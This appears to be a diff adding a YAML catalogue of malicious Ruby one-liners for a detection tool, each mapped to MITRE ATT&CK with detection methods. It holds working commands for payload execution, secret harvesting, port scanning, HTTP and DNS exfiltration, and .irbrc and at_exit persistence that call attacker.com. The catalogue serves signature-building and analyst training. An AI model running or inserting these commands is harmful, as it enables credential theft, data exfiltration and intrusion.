@@ -1,0 +1,223 @@
+# =============================================================================
+# RubyGuardian Phase 1c -- Malicious Ruby One-Liners Database
+#
+# EDUCATIONAL PURPOSE ONLY -- Authorized security research.
+# DO NOT execute these one-liners on systems you do not own or have explicit
+# authorization to test. These samples are provided solely for:
+#   - Building detection signatures and YARA/Sigma rules
+#   - Training security analysts to recognize Ruby-based attacks
+#   - Understanding attacker techniques to improve defensive tooling
+#
+# Each entry includes detection methods so defenders can build countermeasures.
+# MITRE ATT&CK mappings are provided for framework alignment.
+# =============================================================================
+
+---
+# ─────────────────────────────────────────────────────────────
+# EXECUTION TECHNIQUES
+# ─────────────────────────────────────────────────────────────
+- code: "ruby -e 'eval(Base64.decode64(ARGV[0]))'"
+  description: "Execute Base64-encoded Ruby code passed as argument"
+  category: execution
+  mitre_id: "T1059.007"
+  ruby_apis: ["Kernel.eval", "Base64.decode64"]
+  risk_level: critical
+  detection_methods:
+    - "Alert on eval() receiving Base64.decode64 output"
+    - "Sigma rule: process_creation with ruby AND base64 in command line"
+    - "Static analysis: flag eval(Base64.*) patterns"
+  why_malicious: "Allows execution of arbitrary encoded payloads, evading simple string-matching detection"
+
+- code: "ruby -e 'Kernel.send(:system, *ARGV)'"
+  description: "Execute system commands via dynamic dispatch to bypass naive eval monitoring"
+  category: execution
+  mitre_id: "T1059.007"
+  ruby_apis: ["Kernel.send", "Kernel.system"]
+  risk_level: high
+  detection_methods:
+    - "Monitor Object#send calls targeting Kernel/system methods"
+    - "Flag send(:system, ...) and send(:exec, ...) patterns"
+    - "AST analysis for send() with symbol literal :system"
+  why_malicious: "Dynamic dispatch hides the actual method being called from static analysis"
+
+- code: "ruby -e 'IO.popen(ARGV[0]) { |io| puts io.read }'"
+  description: "Execute command via IO.popen and capture output"
+  category: execution
+  mitre_id: "T1059.007"
+  ruby_apis: ["IO.popen"]
+  risk_level: high
+  detection_methods:
+    - "Monitor IO.popen calls with external input as argument"
+    - "Audit process tree for ruby spawning unexpected child processes"
+  why_malicious: "IO.popen is less commonly monitored than system() or backticks"
+
+- code: "ruby -e 'require \"open3\"; Open3.popen3(ARGV[0]) { |i,o,e,t| puts o.read }'"
+  description: "Execute command with full stdin/stdout/stderr control via Open3"
+  category: execution
+  mitre_id: "T1059.007"
+  ruby_apis: ["Open3.popen3"]
+  risk_level: high
+  detection_methods:
+    - "Monitor Open3 usage with user-controlled arguments"
+    - "Flag processes that use Open3 to spawn shells"
+  why_malicious: "Full I/O control enables interactive command execution and data piping"
+
+# ─────────────────────────────────────────────────────────────
+# CREDENTIAL ACCESS
+# ─────────────────────────────────────────────────────────────
+- code: "ruby -e 'ENV.each { |k,v| puts \"#{k}=#{v}\" if k =~ /KEY|SECRET|TOKEN|PASS|CRED/i }'"
+  description: "Harvest secrets from environment variables using pattern matching"
+  category: credential_access
+  mitre_id: "T1552.001"
+  ruby_apis: ["ENV"]
+  risk_level: high
+  detection_methods:
+    - "Monitor ENV access patterns filtering on secret-related keys"
+    - "Audit ruby processes that iterate over entire ENV hash"
+    - "EDR rule: ruby process reading multiple credential-related env vars"
+  why_malicious: "Environment variables commonly store API keys, database passwords, and tokens"
+
+- code: "ruby -ryaml -e 'Dir.glob(\"**/{.env,secrets*,credentials*,*.key}\").each { |f| puts File.read(f) }'"
+  description: "Recursively find and read secret files across a directory tree"
+  category: credential_access
+  mitre_id: "T1552.001"
+  ruby_apis: ["Dir.glob", "File.read"]
+  risk_level: critical
+  detection_methods:
+    - "File access monitoring for patterns matching secret file names"
+    - "Alert on mass file reads following glob for .env/secrets patterns"
+    - "HIDS rule: ruby reading multiple sensitive file types in sequence"
+  why_malicious: "Automated discovery and exfiltration of all credential files"
+
+# ─────────────────────────────────────────────────────────────
+# RECONNAISSANCE
+# ─────────────────────────────────────────────────────────────
+- code: "ruby -rsocket -e '(1..1024).each { |p| begin; TCPSocket.new(ARGV[0], p).close; puts \"#{p} open\"; rescue; end }'"
+  description: "TCP connect scan of common ports on a target host"
+  category: reconnaissance
+  mitre_id: "T1046"
+  ruby_apis: ["TCPSocket.new"]
+  risk_level: medium
+  detection_methods:
+    - "Network IDS: sequential TCP SYN to many ports from single source"
+    - "Host: ruby process opening many short-lived TCP connections"
+    - "Firewall logs: connection refused patterns from ruby PID"
+  why_malicious: "Network scanning without external tools (nmap), using only Ruby stdlib"
+
+- code: "ruby -rsocket -e 'puts Socket.getaddrinfo(ARGV[0], nil).map { |a| a[3] }.uniq'"
+  description: "DNS resolution to enumerate IP addresses for a hostname"
+  category: reconnaissance
+  mitre_id: "T1018"
+  ruby_apis: ["Socket.getaddrinfo"]
+  risk_level: low
+  detection_methods:
+    - "Monitor DNS query volume from ruby processes"
+    - "Flag bulk DNS resolution from non-DNS-server processes"
+  why_malicious: "Enumerate infrastructure IP addresses for target mapping"
+
+# ─────────────────────────────────────────────────────────────
+# DEFENSE EVASION
+# ─────────────────────────────────────────────────────────────
+- code: "ruby -e 'eval(Marshal.load(Base64.decode64(ARGV[0])).force_encoding(\"UTF-8\"))'"
+  description: "Triple-layer decode (Base64 -> Marshal -> eval) for payload obfuscation"
+  category: defense_evasion
+  mitre_id: "T1027"
+  ruby_apis: ["Kernel.eval", "Marshal.load", "Base64.decode64"]
+  risk_level: critical
+  detection_methods:
+    - "Flag Marshal.load from untrusted input (deserialization attack)"
+    - "Alert on eval() receiving output of Marshal.load"
+    - "Sigma rule: ruby command line containing both marshal and base64"
+  why_malicious: "Multi-layer encoding defeats single-layer signature detection"
+
+- code: "ruby -e '$LOAD_PATH.unshift(\"/tmp/evil\"); require \"payload\"'"
+  description: "Prepend attacker-controlled directory to Ruby load path"
+  category: defense_evasion
+  mitre_id: "T1574.001"
+  ruby_apis: ["$LOAD_PATH", "Kernel.require"]
+  risk_level: high
+  detection_methods:
+    - "Monitor $LOAD_PATH modifications at runtime"
+    - "Alert on require from world-writable directories"
+    - "File integrity monitoring on directories in $LOAD_PATH"
+  why_malicious: "Load path manipulation causes Ruby to load attacker libraries instead of legitimate ones"
+
+- code: "ruby -e 'eval(Zlib::Inflate.inflate(Base64.decode64(ARGV[0])))'"
+  description: "Decompress and execute a zlib-compressed, Base64-encoded payload"
+  category: defense_evasion
+  mitre_id: "T1027"
+  ruby_apis: ["Kernel.eval", "Zlib::Inflate", "Base64.decode64"]
+  risk_level: critical
+  detection_methods:
+    - "Alert on Zlib decompression followed by eval"
+    - "Monitor for ruby -e with compressed payloads in arguments"
+  why_malicious: "Compression layer makes payload unreadable and varies its signature"
+
+# ─────────────────────────────────────────────────────────────
+# EXFILTRATION
+# ─────────────────────────────────────────────────────────────
+- code: "ruby -rnet/http -e 'Net::HTTP.post(URI(ARGV[0]), File.read(ARGV[1]), {\"Content-Type\" => \"application/octet-stream\"})'"
+  description: "Exfiltrate file contents via HTTP POST to attacker-controlled server"
+  category: exfiltration
+  mitre_id: "T1048.003"
+  ruby_apis: ["Net::HTTP.post", "File.read"]
+  risk_level: critical
+  detection_methods:
+    - "DLP: monitor HTTP POST with large binary payloads from ruby"
+    - "Network: alert on ruby process contacting unknown external hosts"
+    - "Proxy logs: POST requests from ruby user-agent to non-allowlisted domains"
+  why_malicious: "Direct file exfiltration to attacker infrastructure over HTTP"
+
+- code: "ruby -rresolv -e 'data = File.binread(ARGV[1]).unpack1(\"H*\").scan(/.{1,60}/).each_with_index { |c,i| Resolv::DNS.new.getresource(\"#{i}.#{c}.#{ARGV[0]}\", Resolv::DNS::Resource::IN::TXT) rescue nil }'"
+  description: "Exfiltrate file data via DNS TXT query encoding (DNS tunneling)"
+  category: exfiltration
+  mitre_id: "T1048.001"
+  ruby_apis: ["Resolv::DNS", "File.binread"]
+  risk_level: critical
+  detection_methods:
+    - "DNS monitoring: high volume of TXT queries with hex-encoded subdomains"
+    - "Alert on DNS queries with unusually long subdomain labels"
+    - "Network: ruby process making direct DNS queries (bypassing system resolver)"
+  why_malicious: "DNS tunneling exfiltrates data over a protocol rarely blocked by firewalls"
+
+# ─────────────────────────────────────────────────────────────
+# PERSISTENCE
+# ─────────────────────────────────────────────────────────────
+- code: "ruby -e 'File.write(Dir.home + \"/.irbrc\", \"system(\\\"curl attacker.com/payload | bash\\\")\\n\", mode: \"a\")'"
+  description: "Append malicious code to .irbrc for execution when IRB is started"
+  category: persistence
+  mitre_id: "T1546.004"
+  ruby_apis: ["File.write", "Dir.home"]
+  risk_level: high
+  detection_methods:
+    - "File integrity monitoring on .irbrc, .pryrc, .gemrc files"
+    - "Alert on writes to Ruby RC files from non-editor processes"
+    - "Hash comparison of RC files against known-good baselines"
+  why_malicious: "Ruby RC files execute automatically, providing persistent code execution"
+
+- code: "ruby -e 'at_exit { system(\"curl -s attacker.com/beacon?host=#{`hostname`.strip}\") }'"
+  description: "Register an at_exit callback that beacons to attacker on process termination"
+  category: persistence
+  mitre_id: "T1053"
+  ruby_apis: ["Kernel.at_exit", "Kernel.system"]
+  risk_level: high
+  detection_methods:
+    - "Monitor at_exit handler registration in production processes"
+    - "Alert on network connections during process shutdown sequence"
+    - "Audit at_exit blocks for system() or network calls"
+  why_malicious: "Callbacks execute during normal shutdown, making them hard to attribute to malicious activity"
+
+# ─────────────────────────────────────────────────────────────
+# LATERAL MOVEMENT
+# ─────────────────────────────────────────────────────────────
+- code: "ruby -rdrb -e 'DRb.start_service; obj = DRbObject.new_with_uri(ARGV[0]); obj.instance_eval(ARGV[1])'"
+  description: "Connect to a DRb service and execute arbitrary code via instance_eval"
+  category: lateral_movement
+  mitre_id: "T1021"
+  ruby_apis: ["DRb", "DRbObject", "instance_eval"]
+  risk_level: critical
+  detection_methods:
+    - "Monitor DRb protocol traffic on non-standard ports"
+    - "Alert on instance_eval calls on DRb remote objects"
+    - "Network segmentation to prevent DRb cross-host communication"
+  why_malicious: "DRb allows remote Ruby code execution across the network without authentication by default"
